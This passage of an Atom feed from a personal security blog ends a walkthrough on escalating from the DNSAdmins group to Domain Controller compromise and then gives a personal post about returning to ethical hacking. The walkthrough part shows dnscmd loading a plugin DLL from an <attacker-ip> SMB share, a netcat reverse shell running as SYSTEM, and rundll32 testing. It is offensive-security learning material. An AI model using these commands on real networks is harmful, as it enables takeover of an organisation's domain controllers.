        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WIN32_EXIT_CODE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SERVICE_EXIT_CODE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CHECKPOINT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WAIT_HINT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x7530&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;and then start it again:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sc.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SERVICE_NAME:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;TYPE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;               &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WIN32_OWN_PROCESS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;STATE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;START_PENDING&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
                                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;NOT_STOPPABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NOT_PAUSABLE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IGNORES_SHUTDOWN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WIN32_EXIT_CODE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SERVICE_EXIT_CODE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;CHECKPOINT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;WAIT_HINT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0x7d0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2756&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FLAGS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Back at your &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; session we should see a connection and our prompt:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;Windows&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Copyright&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Microsoft&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Corporation.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rights&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reserved.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Windows\system32&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;nt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;authority\system&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We now have control of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Domain Controller&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In the scenario where you need to host the &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt; remotely you can fireup &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/impacket/smbserver.py&quot;&gt;impacket’s smbserver.py&lt;/a&gt; on the &lt;code class=&quot;highlighter-rouge&quot;&gt;attacker&lt;/code&gt; machine:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;smbserver.py TMP /path/to/dll/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And then modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;dnscmd&lt;/code&gt; command:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;dnscmd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/config&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/serverlevelplugindll&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attacker-ip&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\TMP\DNSADMIN.dll&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you find that you do not receive a connection you can run the following command to test the &lt;code class=&quot;highlighter-rouge&quot;&gt;DLL&lt;/code&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-posh&quot; data-lang=&quot;posh&quot;&gt;&lt;span class=&quot;nf&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rundll32.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\DNSAdmin.dll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DnsPluginInitialize&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If you get a connection to your &lt;code class=&quot;highlighter-rouge&quot;&gt;netcat&lt;/code&gt; session then there is most likely some interference on the &lt;code class=&quot;highlighter-rouge&quot;&gt;victim&lt;/code&gt; machine (AV, Firewall etc.)&lt;/p&gt;</content><author><name>Sabe Barker</name></author><summary type="html">In this post I will explain how a user within the DNSAdmins group can accomplish</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://sabebarker.com/assets/img/blog/dnsadmin-to-domain-controller-compromise/dnsadmin-to-domain-controller-compromise.png" /><media:content medium="image" url="https://sabebarker.com/assets/img/blog/dnsadmin-to-domain-controller-compromise/dnsadmin-to-domain-controller-compromise.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">The Path To Becoming An Ethical Hacker</title><link href="https://sabebarker.com/blog/the-path-to-becoming-an-ethical-hacker/" rel="alternate" type="text/html" title="The Path To Becoming An Ethical Hacker" /><published>2019-12-19T00:00:00+08:00</published><updated>2019-12-19T00:00:00+08:00</updated><id>https://sabebarker.com/blog/the-path-to-becoming-an-ethical-hacker</id><content type="html" xml:base="https://sabebarker.com/blog/the-path-to-becoming-an-ethical-hacker/">&lt;p&gt;But now, times have changed from those days in the mid 90’s. The simple problems are still the same. Misconfigurations, unpatched systems and weak passwords. But the landscape has evolved to something completely new. From malware techniques such as ransomware and cryptojacking to advanced persistent threat groups such as Fancy Bear and Stardust Chollima, attacks are more sophisticated and harder to detect.&lt;/p&gt;

&lt;p&gt;Although I have been out of the game for over a decade I still have a strong interest in cybersecurity. So why didn’t I stick with it back in the day? Simply put, I got sidetracked. Kids, mortgage, all that life stuff. Certain avenues I took led me away from the IT industry completely and even when I found myself back it wasn’t in the computer security arena. But after a major event in my life I have taken a hard look at where I am and where I want to be.&lt;/p&gt;

&lt;p&gt;After a lot of thought the decision was made that cybersecurity is not only where I want to be it is where I need to be. It’s hard to explain but when I am doing anything related to cybersecurity I feel like myself again. The other side to that coin however is that whenever I do anything related to computer security I feel like a fraud. I feel like no matter what I do no matter the amount of knowledge I gain I feel like it isn’t enough. Like I should be doing more. I should know more.&lt;/p&gt;

&lt;p&gt;As I write over time you will probably notice that I never refer to myself as a hacker. I’m not too sure if it is the old school mindset I have but you are not a hacker unless you are recognised as one by known hackers within the community. Hackers that have proven themselves to the community. From my experience it seems that everyone these days are calling themselves hackers.&lt;/p&gt;

&lt;p&gt;Many that I have met seemed to have very limited knowledge but were still quite happy to call themselves a hacker even though they wouldn’t be able to hack their way out of a wet paper bag. I refuse to be one of those people.&lt;/p&gt;

&lt;p&gt;Ok so I have gotten off track. Story of my life. Where were we? &lt;em&gt;The Path To Becoming An Ethical Hacker&lt;/em&gt;, right! So like I have mentioned I want to get back into hacking. I want to get some certificates under my belt. CISSP, CEH, OSCP the usual culprits. But I don’t want this to be my main focus. Practical learning is key I feel. So I will get started at places like &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;Hack The Box&lt;/a&gt; and &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;VulnHub&lt;/a&gt; as well as building my confidence to enter capture the flag competitions in my local area.&lt;/p&gt;

&lt;p&gt;On this site I will be keeping notes on various things I am learning and will be of a somewhat formal format. You will generally find these under the &lt;a href=&quot;/writeups/&quot;&gt;Writeups&lt;/a&gt; section. My &lt;a href=&quot;/blog/&quot;&gt;Blog&lt;/a&gt; where you are currently located will contain more personal thoughts and rants as you are experiencing at this very moment (apologies). No formal structure here I will just write what is on my mind. Finally, the &lt;a href=&quot;/tools/&quot;&gt;Tools&lt;/a&gt; section will be a directory of sorts listing tools that I have used with a little info about them and how I use them.&lt;/p&gt;

&lt;p&gt;Maybe someone will find the info helpful, who knows. But my main goal here is to force myself to write stuff down to not only help with retaining information but also as a reference for myself in the future. I had tried to do this a few times with tools such as KeepNote and the likes but I either got over it or it became a huge mess. I thought this might be more fun and it might force me to be more organised. We will see.&lt;/p&gt;

&lt;p&gt;I have attended my local &lt;em&gt;Bsides&lt;/em&gt; for the last few years and have really enjoyed them so I will continue with that. As well as getting back to attending my local &lt;em&gt;Sectalks&lt;/em&gt; group. Deal with some of that social anxiety I have got going on.&lt;/p&gt;

&lt;p&gt;Anyways, I think I have written enough for my first post. If you have any feedback about the site hit me up. My social media links can be found at the top right of the site. I would love to know your thoughts.&lt;/p&gt;</content><author><name>Sabe Barker</name></author><summary type="html">Many years ago in my early teens I became interested in hacking. This was a time when</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://sabebarker.com/assets/img/blog/the-path-to-becoming-an-ethical-hacker.png" /><media:content medium="image" url="https://sabebarker.com/assets/img/blog/the-path-to-becoming-an-ethical-hacker.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>